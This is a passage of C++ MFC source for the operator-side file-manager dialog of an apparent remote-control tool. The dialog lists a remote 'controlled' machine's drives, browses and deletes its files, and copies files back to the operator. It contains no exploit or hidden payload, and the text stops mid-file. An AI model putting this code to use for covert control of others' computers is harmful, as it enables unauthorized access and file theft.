// DlgFileManager.cpp : 实现文件
//

#include "stdafx.h"
#include "Server.h"
#include "DlgFileManager.h"
#include "DlgFileNewFolder.h"
#include "DlgFileMode.h"
#include "afxdialogex.h"

// CDlgFileManager 对话框

static UINT __Indicators[] =
{
	ID_SEPARATOR,
	ID_SEPARATOR,
	IDR_STATUSBAR_FILE_MANAGER_PROGRESS,
};

IMPLEMENT_DYNAMIC(CDlgFileManager, CDialog)

CDlgFileManager::CDlgFileManager(CWnd* pParent, _CIOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
	: CDialog(IDD_DIALOG_FILE_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));



	memset(m_ClientData, 0, sizeof(m_ClientData));
	memcpy(m_ClientData, ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1),
		ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength() - 1);

	SHFILEINFO	v1;
	//卷图标
	HIMAGELIST ImageListHwnd;   //SDK
								// 加载系统图标列表
	ImageListHwnd = (HIMAGELIST)SHGetFileInfo
	(
		NULL,
		0,
		&v1,
		sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
	);
	m_CImageList_Large = CImageList::FromHandle(ImageListHwnd);   //CimageList*
																  //加载系统图标列表
	ImageListHwnd = (HIMAGELIST)SHGetFileInfo
	(
		NULL,
		0,
		&v1,
		sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
	);
	m_CImageList_Small = CImageList::FromHandle(ImageListHwnd);
	//拖拉拽文件
	m_IsDragging = FALSE;
	//拷贝文件的过程可以停止
	m_IsStop = FALSE;

	m_TransferMode = TRANSFER_MODE_NORMAL;

}

CDlgFileManager::~CDlgFileManager()
{
}

void CDlgFileManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);

	DDX_Control(pDX, IDC_LIST_DIALOG_FILE_MANAGER_SERVER, m_CListCtrl_Dialog_File_Manager_Server);
	DDX_Control(pDX, IDC_LIST_DIALOG_FILE_MANAGER_CLIENT, m_CListCtrl_Dialog_File_Manager_Client);
	DDX_Control(pDX, IDC_STATIC_DIALOG_FILE_MANAGER_SERVER_POSITION, m_CStatic_Dialog_File_Manager_Server_Position);
	DDX_Control(pDX, IDC_STATIC_DIALOG_FILE_MANAGER_CLIENT_POSITION, m_CStatic_Dialog_File_Manager_Client_Position);
	DDX_Control(pDX, IDC_COMBO_DIALOG_FILE_MANAGER_SERVER_FILE, m_CCombo_Dialog_File_Manager_Server_File);
	DDX_Control(pDX, IDC_COMBO_DIALOG_FILE_MANAGER_CLIENT_FILE, m_CCombo_Dialog_File_Manager_Client_File);
}

BEGIN_MESSAGE_MAP(CDlgFileManager, CDialog)
	ON_WM_CLOSE()
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_DIALOG_FILE_MANAGER_SERVER, &CDlgFileManager::OnNMDblclkListDialogFileManagerServer)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_DIALOG_FILE_MANAGER_CLIENT, &CDlgFileManager::OnNMDblclkListDialogFileManagerClient)
	//转到
	ON_BN_CLICKED(IDC_BUTTON1, &CDlgFileManager::OnBnClickedButton1)
	
	//返回上一级目录
	ON_COMMAND(IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN_PREVIOUS, &CDlgFileManager::OnServerFilePrevious)
	ON_COMMAND(IDR_TOOLBAR_DIALOG_REMOTE_FILE_MANAGER_MAIN_PREVIOUS, &CDlgFileManager::OnClientFilePrevious)
	//删除文件
	ON_COMMAND(IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN_DELETE, &CDlgFileManager::OnServerFileDelete)
	ON_COMMAND(IDR_TOOLBAR_DIALOG_REMOTE_FILE_MANAGER_MAIN_DELETE, &CDlgFileManager::OnClientFileDelete)
	//新建文件
	ON_COMMAND(IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN_NEW_FOLDER, &CDlgFileManager::OnServerFileNewFolder)
	ON_COMMAND(IDR_TOOLBAR_DIALOG_REMOTE_FILE_MANAGER_MAIN_NEW_FOLDER, &CDlgFileManager::OnClientFileNewFolder)

	//ON_COMMAND(IDR_TOOLBAR_DIALOG_REMOTE_FILE_MANAGER_MAIN_VIEW, &CDlgFileManager::OnViewFileServerBig)
	ON_COMMAND(IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN_FINDER, &CDlgFileManager::OnServerFileStop)
	
	ON_BN_CLICKED(IDC_BUTTON2, &CDlgFileManager::OnBnClickedButton2)
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_DIALOG_FILE_MANAGER_SERVER, &CDlgFileManager::OnLvnBegindragListDialogFileManagerServer)
	ON_WM_MOUSEMOVE()
	ON_WM_LBUTTONUP()
	ON_NOTIFY(LVN_BEGINDRAG, IDC_LIST_DIALOG_FILE_MANAGER_CLIENT, &CDlgFileManager::OnLvnBegindragListDialogFileManagerClient)
END_MESSAGE_MAP()

// CDlgFileManager 消息处理程序

BOOL CDlgFileManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_IconHwnd, FALSE);
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("\\\\%s - 文件管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);



	//界面设置
	if (!m_ToolBar_Server_Dialog_File_Manager.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN)
		|| !m_ToolBar_Server_Dialog_File_Manager.LoadToolBar(IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN))
	{

		return -1;
	}
	m_ToolBar_Server_Dialog_File_Manager.LoadTrueColorToolBar
	(
		24,    //加载真彩工具条 
		IDB_BITMAP_FILE,
		IDB_BITMAP_FILE,
		IDB_BITMAP_FILE    //没有用
	);



	if (!m_ToolBar_Client_Dialog_File_Manager.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY, IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN)
		|| !m_ToolBar_Client_Dialog_File_Manager.LoadToolBar(IDR_TOOLBAR_DIALOG_REMOTE_FILE_MANAGER_MAIN))
	{

		return -1;
	}
	m_ToolBar_Client_Dialog_File_Manager.LoadTrueColorToolBar
	(
		24,    //加载真彩工具条 
		IDB_BITMAP_FILE,
		IDB_BITMAP_FILE,
		IDB_BITMAP_FILE    //没有用
	);
	

	m_ToolBar_Server_Dialog_File_Manager.AddDropDownButton(this, 
		IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN_VIEW, IDR_TOOLBAR_DIALOG_FILE_MANAGER_MAIN_VIEW);
	m_ToolBar_Server_Dialog_File_Manager.SetButtonText(0, "返回");     //在位图的下面添加文件
	m_ToolBar_Server_Dialog_File_Manager.SetButtonText(1, "查看");
	m_ToolBar_Server_Dialog_File_Manager.SetButtonText(2, "删除");
	m_ToolBar_Server_Dialog_File_Manager.SetButtonText(3, "新建");
	m_ToolBar_Server_Dialog_File_Manager.SetButtonText(4, "查找");
	m_ToolBar_Server_Dialog_File_Manager.SetButtonText(5, "停止");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示

	m_ToolBar_Client_Dialog_File_Manager.AddDropDownButton(this,
		IDR_TOOLBAR_DIALOG_REMOTE_FILE_MANAGER_MAIN_VIEW, IDR_TOOLBAR_DIALOG_REMOTE_FILE_MANAGER_MAIN_VIEW);
	m_ToolBar_Client_Dialog_File_Manager.SetButtonText(0, "返回");     //在位图的下面添加文件
	m_ToolBar_Client_Dialog_File_Manager.SetButtonText(1, "查看");
	m_ToolBar_Client_Dialog_File_Manager.SetButtonText(2, "删除");
	m_ToolBar_Client_Dialog_File_Manager.SetButtonText(3, "新建");
	m_ToolBar_Client_Dialog_File_Manager.SetButtonText(4, "查找");
	m_ToolBar_Client_Dialog_File_Manager.SetButtonText(5, "停止");
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0);  //显示

	m_CListCtrl_Dialog_File_Manager_Server.SetImageList(m_CImageList_Large, LVSIL_NORMAL);
	m_CListCtrl_Dialog_File_Manager_Server.SetImageList(m_CImageList_Small, LVSIL_SMALL);
	m_CListCtrl_Dialog_File_Manager_Client.SetImageList(m_CImageList_Large, LVSIL_NORMAL);
	m_CListCtrl_Dialog_File_Manager_Client.SetImageList(m_CImageList_Small, LVSIL_SMALL);

	RECT	RectClient;
	GetClientRect(&RectClient);           //获得整个窗口大小

	CRect v3;
	v3.top = RectClient.bottom - 25;
	v3.left = 0;
	v3.right = RectClient.right;
	v3.bottom = RectClient.bottom;
	
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(__Indicators,
			sizeof(__Indicators) / sizeof(UINT)))
	{
		return -1;
	}
	m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_StatusBar.SetPaneInfo(1, m_StatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_StatusBar.SetPaneInfo(2, m_StatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏

	m_StatusBar.MoveWindow(v3);

	m_StatusBar.GetItemRect(1, &RectClient);

	RectClient.bottom -= 1;

	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, RectClient, &m_StatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
	m_ProgressCtrl->SetPos(0);

	//------------------------------------------------------------------------Server真彩
	RECT	RectServer;
	m_CStatic_Dialog_File_Manager_Server_Position.GetWindowRect(&RectServer);
	m_CStatic_Dialog_File_Manager_Server_Position.ShowWindow(SW_HIDE);
	//显示工具栏
	m_ToolBar_Server_Dialog_File_Manager.MoveWindow(&RectServer);

	//-----------------------------------------------------------------------Client真彩

	m_CStatic_Dialog_File_Manager_Client_Position.GetWindowRect(&RectClient);
	m_CStatic_Dialog_File_Manager_Client_Position.ShowWindow(SW_HIDE);
	//显示工具栏
	m_ToolBar_Client_Dialog_File_Manager.MoveWindow(&RectClient);


	FixedServerVolumeList();
	FixedClientVolumeList();
 

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

void CDlgFileManager::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		CancelIo((HANDLE)m_ContextObject->ClientSocket);
		closesocket(m_ContextObject->ClientSocket);
		m_ContextObject->DialogHandle = NULL;
		m_ContextObject->DialogID = 0;
	}
	CDialog::OnClose();
}

void CDlgFileManager::WindowHandleIO()
{
	if (m_ContextObject == NULL)
	{
		return;
	}

	switch (m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(0)[0])
	{
	case CLIENT_FILE_MANAGER_FILE_LIST_REPLY:
	{
		FixedClientFilesList(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(),
			m_ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength() - 1);
		break;
	}
	//新建文件夹
	case CLIENT_FILE_MANAGER_NEW_FLODER_REPLY:
	{
		BOOL* IsOk = (BOOL*)m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1);
		if (*IsOk){
			GetClientFilesList(".");
		}
		else{
			MessageBox("新建失败");
		}
		break;
	}
	//删除文件
	case CLIENT_FILE_MANAGER_DELETE_REPLY:
	{
		BOOL* IsOk = (BOOL*)m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1);
		if (*IsOk){
			GetClientFilesList(".");
		}
		else{
			MessageBox("删除失败");
		}
		EnableControl(TRUE);
		break;
	}
	//在客户端发现有重名文件
	case CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE:
	{
		
		SendTransferMode();
		break;
	}
	case CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE:
	{
		SendServerFileDataToClient();
		break;
	}
	case CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH_REPLY://接收从客户端文件夹下枚举的所有文件路径 压入任务列表
	{
		CString FileFullPath;
		FileFullPath.Format("%s", m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1));
		m_ClientFileToServerJob.AddTail(FileFullPath);
		break;
	}
	case CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH_END://从客户端枚举文件夹下的文件完成
	{
		//判断任务列表是否为空
		if (m_ClientFileToServerJob.IsEmpty())
		{
			::MessageBox(m_hWnd, "文件夹为空", "警告", MB_OK | MB_ICONWARNING);
			return;
		}
		//禁用当前窗口 窗口控件变灰
		EnableControl(FALSE);
		//转换第一个文件路径 
		ClientToServerFileFullPath();
		break;
	}

	case CLIENT_FILE_MANAGER_SEND_COPY_FILE_INFORMATION_FROM_CLIENT_REPLY:
	{
		memcpy(&m_OperatingFileLength, m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1), 8);
	}
	case CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER_REPLY:
	{
		//收到客户端发送的文件数据
		WriteServerReceiveFile(m_ContextObject->m_ReceivedDecompressdBufferData.GetBuffer(1),
			m_ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength() - 1);
		break;
	}
	case CLIENT_FILE_MANAGER_ONE_COPY_FILE_SUCCESS:
	{
		//从客户端拷贝单个文件成功 判断是否继续从客户端拷贝文件到服务器
		EndCopyClientToServer();
		break;
	}

	}
}

VOID CDlgFileManager::FixedServerVolumeList()
{
	char VolumeListData[0x500] = { 0 };
	CHAR *Travel = NULL;
	m_CListCtrl_Dialog_File_Manager_Server.DeleteAllItems();
	while (m_CListCtrl_Dialog_File_Manager_Server.DeleteColumn(0) != 0);
	//初始化列表信息
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(0, "名称", LVCFMT_LEFT, 50);
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(1, "类型", LVCFMT_RIGHT, 80);
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(2, "文件系统", LVCFMT_RIGHT, 60);
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(3, "总大小", LVCFMT_RIGHT, 100);
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(4, "可用空间", LVCFMT_RIGHT, 100);

	m_CListCtrl_Dialog_File_Manager_Server.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	GetLogicalDriveStrings(sizeof(VolumeListData), (LPSTR)VolumeListData);  //c:\.d:\.
	Travel = VolumeListData;

	CHAR	FileSystemType[MAX_PATH];  //ntfs  fat32
	unsigned __int64	HardDiskAmount = 0;   //HardDisk
	unsigned __int64	HardDiskFreeSpace = 0;
	unsigned long		HardDiskAmountMB = 0; // 总大小
	unsigned long		HardDiskFreeSpaceMB = 0;   // 剩余空间

	for (int i = 0; *Travel != '\0'; i++, Travel += lstrlen(Travel) + 1)
	{
		// 得到磁盘相关信息
		memset(FileSystemType, 0, sizeof(FileSystemType));
		// 得到文件系统信息及大小
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, FileSystemType, MAX_PATH);

		ULONG	FileSystemLength = lstrlen(FileSystemType) + 1;
		if (GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&HardDiskFreeSpace, (PULARGE_INTEGER)&HardDiskAmount, NULL))
		{
			HardDiskAmountMB = HardDiskAmount / 1024 / 1024;
			HardDiskFreeSpaceMB = HardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			HardDiskAmountMB = 0;
			HardDiskFreeSpaceMB = 0;
		}


		int	iItem = m_CListCtrl_Dialog_File_Manager_Server.InsertItem(i, Travel, GetServerIconIndex(Travel, GetFileAttributes(Travel)));    //顺便获得系统的图标		

		m_CListCtrl_Dialog_File_Manager_Server.SetItemData(iItem, 1);

		m_CListCtrl_Dialog_File_Manager_Server.SetItemText(iItem, 2, FileSystemType);


		SHFILEINFO	sfi;
		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		m_CListCtrl_Dialog_File_Manager_Server.SetItemText(iItem, 1, sfi.szTypeName);


		CString	v1;
		v1.Format("%10.1f GB", (float)HardDiskAmountMB / 1024);
		m_CListCtrl_Dialog_File_Manager_Server.SetItemText(iItem, 3, v1);
		v1.Format("%10.1f GB", (float)HardDiskFreeSpaceMB / 1024);
		m_CListCtrl_Dialog_File_Manager_Server.SetItemText(iItem, 4, v1);
	}
}

int	CDlgFileManager::GetServerIconIndex(LPCTSTR Volume, DWORD FileAttributes)
{
	SHFILEINFO	sfi;
	if (FileAttributes == INVALID_FILE_ATTRIBUTES)
		FileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		FileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
	(
		Volume,
		FileAttributes,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
	);

	return sfi.iIcon;
}

VOID CDlgFileManager::FixedClientVolumeList()
{
	m_CListCtrl_Dialog_File_Manager_Client.DeleteAllItems();
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(0, "名称", LVCFMT_LEFT, 50);
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(1, "类型", LVCFMT_LEFT, 80);
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(2, "文件系统", LVCFMT_LEFT, 60);
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(3, "总大小", LVCFMT_LEFT, 100);
	m_CListCtrl_Dialog_File_Manager_Client.InsertColumn(4, "可用空间", LVCFMT_LEFT, 100);

	m_CListCtrl_Dialog_File_Manager_Client.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	char	*Travel = NULL;
	Travel = (char *)m_ClientData;   //已经去掉了消息头的1个字节了

	int i = 0;
	ULONG v1 = 0;
	for (i = 0; Travel[i] != '\0';)
	{
		//由驱动器名判断图标的索引
		if (Travel[i] == 'A' || Travel[i] == 'B')
		{
			v1 = 6;
		}
		else
		{
			switch (Travel[i + 1])   //这里是判断驱动类型 查看被控端
			{
			case DRIVE_REMOVABLE:
				v1 = 2 + 5;
				break;
			case DRIVE_FIXED:
				v1 = 3 + 5;
				break;
			case DRIVE_REMOTE:
				v1 = 4 + 5;
				break;
			case DRIVE_CDROM:
				v1 = 9;	//Win7为10
				break;
			default:
				v1 = 0;
				break;
			}
		}
		//		02E3F844  43 03 04 58 02 00 73 D7 00 00 B1 BE B5 D8 B4 C5 C5 CC 00 4E 54 46 53 00 44  C..X..s...本地磁盘.NTFS.D
		//		2E3F85E  03 04 20 03 00 FC 5B 00 00 B1 BE B5 D8 B4 C5 C5 CC 00 4E 54 46 53 00
		CString	v3;
		//格式化盘符
		v3.Format("%c:\\", Travel[i]);//c:
		int	iItem = m_CListCtrl_Dialog_File_Manager_Client.InsertItem(i, v3, v1);
		m_CListCtrl_Dialog_File_Manager_Client.SetItemData(iItem, 1);     //不显示  
		//改数据不显示是隐藏当前项中  1代表目录
		unsigned long		HardDiskAmountMB = 0; // 总大小
		unsigned long		HardDiskFreeMB = 0;   // 剩余空间
		memcpy(&HardDiskAmountMB, Travel + i + 2, 4);
		memcpy(&HardDiskFreeMB, Travel + i + 6, 4);
		CString  v5;
		v5.Format("%10.1f GB", (float)HardDiskAmountMB / 1024);
		m_CListCtrl_Dialog_File_Manager_Client.SetItemText(iItem, 3, v5);
		v5.Format("%10.1f GB", (float)HardDiskFreeMB / 1024);
		m_CListCtrl_Dialog_File_Manager_Client.SetItemText(iItem, 4, v5);

		i += 10;   //定义到下有一组数据中

		CString  v7;
		v7 = Travel + i;
		m_CListCtrl_Dialog_File_Manager_Client.SetItemText(iItem, 1, v7);

		i += strlen(Travel + i) + 1;

		CString  FileSystem;
		FileSystem = Travel + i;
		m_CListCtrl_Dialog_File_Manager_Client.SetItemText(iItem, 2, FileSystem);
		i += strlen(Travel + i) + 1;
	}
}

//双击CList中的项Server
void CDlgFileManager::OnNMDblclkListDialogFileManagerServer(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	if (m_CListCtrl_Dialog_File_Manager_Server.GetSelectedCount() == 0)
	{
		return;
	}
	else
	{
		if (m_CListCtrl_Dialog_File_Manager_Server.GetItemData(m_CListCtrl_Dialog_File_Manager_Server.GetSelectionMark()) != 1)
		{
			CString v1;
			v1 = m_CListCtrl_Dialog_File_Manager_Server.GetItemText(m_CListCtrl_Dialog_File_Manager_Server.GetSelectionMark(), 0);
			m_ServerFileFullPath += v1;
			ShellExecute(NULL, "open", m_ServerFileFullPath, NULL,NULL, SW_SHOWNORMAL);

			return;
		}
	}

	if (m_CListCtrl_Dialog_File_Manager_Server.GetSelectedCount() == 0 ||
		m_CListCtrl_Dialog_File_Manager_Server.GetItemData(m_CListCtrl_Dialog_File_Manager_Server.GetSelectionMark()) != 1)
	{
		//点击不是目录
		return;
	}
	FixedServerFileList();
	*pResult = 0;
}

VOID CDlgFileManager::FixedServerFileList(CString strDirectory)
{
	if (strDirectory.GetLength() == 0)
	{
		int	iItem = m_CListCtrl_Dialog_File_Manager_Server.GetSelectionMark();

		// 如果有选中的，是目录
		if (iItem != -1)
		{
			//获得该项的隐藏数据
			if (m_CListCtrl_Dialog_File_Manager_Server.GetItemData(iItem) == 1)   //设置隐藏数据
			{
				//是目录
				strDirectory = m_CListCtrl_Dialog_File_Manager_Server.GetItemText(iItem, 0);
			}
		}
		// 从组合框里得到路径
		else
		{
			m_CCombo_Dialog_File_Manager_Server_File.GetWindowText(m_ServerFileFullPath);
		}
	}

	if (strDirectory == "..")
	{
		m_ServerFileFullPath = GetParentDirectory(m_ServerFileFullPath);
	}
	// 刷新当前用
	else if (strDirectory != ".")   //在系统中的每一个目录中都会存在一个.目录或..目录
	{
		/*  c:\   */
		m_ServerFileFullPath += strDirectory;
		if (m_ServerFileFullPath.Right(1) != "\\")
		{
			m_ServerFileFullPath += "\\";
		}
	}
	if (m_ServerFileFullPath.GetLength() == 0)
	{
		FixedServerVolumeList();
		return;
	}


	//将最终的文件路径放入控件中
	m_CCombo_Dialog_File_Manager_Server_File.InsertString(0, m_ServerFileFullPath);
	m_CCombo_Dialog_File_Manager_Server_File.SetCurSel(0);

	//删除Control上的项
	m_CListCtrl_Dialog_File_Manager_Server.DeleteAllItems();
	while (m_CListCtrl_Dialog_File_Manager_Server.DeleteColumn(0) != 0);  //删除
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(0, "名称", LVCFMT_LEFT, 150);
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_CListCtrl_Dialog_File_Manager_Server.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int	 v10 = 0;
	//自己在ControlList的控件上写一个..目录（双击就返回上一层）
	m_CListCtrl_Dialog_File_Manager_Server.SetItemData(m_CListCtrl_Dialog_File_Manager_Server.InsertItem(v10++, "..",
		GetServerIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)), 1);

	//循环两次代表两种类型（目录与文件）
	for (int i = 0; i < 2; i++) //0 文件夹  1  文件
	{
		CFileFind	FileFindObject;
		BOOL		IsLoop;
		IsLoop = FileFindObject.FindFile(m_ServerFileFullPath + "*.*");   //c:\*.*    代表一切
		while (IsLoop)
		{
			IsLoop = FileFindObject.FindNextFile();
			if (FileFindObject.IsDots())
			{
				continue;
			}
			BOOL bIsInsert = !FileFindObject.IsDirectory() == i;

			if (!bIsInsert)
			{
				continue;
			}
			int iItem = m_CListCtrl_Dialog_File_Manager_Server.InsertItem(v10++, FileFindObject.GetFileName(),
				GetServerIconIndex(FileFindObject.GetFileName(), GetFileAttributes(FileFindObject.GetFilePath())));
			m_CListCtrl_Dialog_File_Manager_Server.SetItemData(iItem, FileFindObject.IsDirectory());
			SHFILEINFO	sfi;
			SHGetFileInfo(FileFindObject.GetFileName(), FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO),
				SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);

			if (FileFindObject.IsDirectory())
			{
				m_CListCtrl_Dialog_File_Manager_Server.SetItemText(iItem, 2, "文件夹");
			}
			else
			{
				m_CListCtrl_Dialog_File_Manager_Server.SetItemText(iItem, 2, sfi.szTypeName);
			}
			CString v1;
			v1.Format("%10d KB", FileFindObject.GetLength() / 1024 + (FileFindObject.GetLength() % 1024 ? 1 : 0));
			m_CListCtrl_Dialog_File_Manager_Server.SetItemText(iItem, 1, v1);
			CTime Time;
			FileFindObject.GetLastWriteTime(Time);
			m_CListCtrl_Dialog_File_Manager_Server.SetItemText(iItem, 3, Time.Format("%Y-%m-%d %H:%M"));
		}
	}
}

CString CDlgFileManager::GetParentDirectory(CString FileFullPath)
{
	CString	v1 = FileFullPath;
	int iIndex = v1.ReverseFind('\\');
	if (iIndex == -1)
	{
		return v1;
	}
	CString v3 = v1.Left(iIndex);
	iIndex = v3.ReverseFind('\\');
	if (iIndex == -1)
	{
		v1 = "";
		return v1;
	}
	v1 = v3.Left(iIndex);

	if (v1.Right(1) != "\\")
	{
		v1 += "\\";
	}
	return v1;
}

//转到目录按键
void CDlgFileManager::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	CString v1;
	m_CCombo_Dialog_File_Manager_Server_File.GetWindowTextA(v1);
	m_ServerFileFullPath = v1;
	FixedServerFileList(NULL);
}

void CDlgFileManager::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	GetClientFilesList();
}

BOOL CDlgFileManager::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	CEdit* Edit = (CEdit*)m_CCombo_Dialog_File_Manager_Server_File.GetWindow(GW_CHILD);
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN && pMsg->hwnd == Edit->m_hWnd)
	{
		CString v1;
		m_CCombo_Dialog_File_Manager_Server_File.GetWindowTextA(v1);
		m_ServerFileFullPath = v1;
		FixedServerFileList(NULL);
		return FALSE;
	}
	return CDialog::PreTranslateMessage(pMsg);
}
//双击CList中的项Client
void CDlgFileManager::OnNMDblclkListDialogFileManagerClient(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	if (m_CListCtrl_Dialog_File_Manager_Client.GetSelectedCount() == 0 ||
		m_CListCtrl_Dialog_File_Manager_Client.GetItemData(m_CListCtrl_Dialog_File_Manager_Client.GetSelectionMark()) != 1)
	{
		return;
	}
	GetClientFilesList();  //发消息

	*pResult = 0;
}

VOID CDlgFileManager::GetClientFilesList(CString Directory)
{
	if (Directory.GetLength() == 0)   //磁盘卷
	{
		int	iItem = m_CListCtrl_Dialog_File_Manager_Client.GetSelectionMark();

		// 如果有选中项
		if (iItem != -1)
		{
			if (m_CListCtrl_Dialog_File_Manager_Client.GetItemData(iItem) == 1)
			{
				//选中项是个目录
				Directory = m_CListCtrl_Dialog_File_Manager_Client.GetItemText(iItem, 0);    /* D:\ */
			}
		}
		//从组合框里得到路径
		else
		{
			m_CCombo_Dialog_File_Manager_Client_File.GetWindowText(m_ClientFileFullPath);
		}
	}

	if (Directory == "..")
	{
		m_ClientFileFullPath = GetParentDirectory(m_ClientFileFullPath);
	}

	else if (Directory != ".")
	{
		m_ClientFileFullPath += Directory;
		if (m_ClientFileFullPath.Right(1) != "\\")
		{
			m_ClientFileFullPath += "\\";
		}
	}


	if (m_ClientFileFullPath.GetLength() == 0)
	{
		//到达根目录，实际就是要刷新卷
		FixedClientVolumeList();
		return;
	}
	m_CCombo_Dialog_File_Manager_Client_File.InsertString(0, m_ClientFileFullPath);
	m_CCombo_Dialog_File_Manager_Client_File.SetCurSel(0);

	ULONG	BufferLength = m_ClientFileFullPath.GetLength() + 2;
	BYTE*   BufferData = (BYTE *)new BYTE[BufferLength];
	//将COMMAND_LIST_FILES  发送到控制端，到控制搜索
	BufferData[0] = CLIENT_FILE_MANAGER_FILE_LIST;
	memcpy(BufferData + 1, m_ClientFileFullPath.GetBuffer(0), BufferLength - 1);
	m_IOCPServer->OnPrepareSending(m_ContextObject, BufferData, BufferLength);
	delete[] BufferData;
	BufferData = NULL;

	//	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	//	m_Remote_Directory_ComboBox.SetCurSel(0);
	// 得到返回数据前禁窗口
	m_CListCtrl_Dialog_File_Manager_Client.EnableWindow(FALSE);   //不能瞎点
	m_ProgressCtrl->SetPos(0);                 //初始化进度条
}

VOID CDlgFileManager::FixedClientFilesList(BYTE *BufferData, ULONG BufferLength)
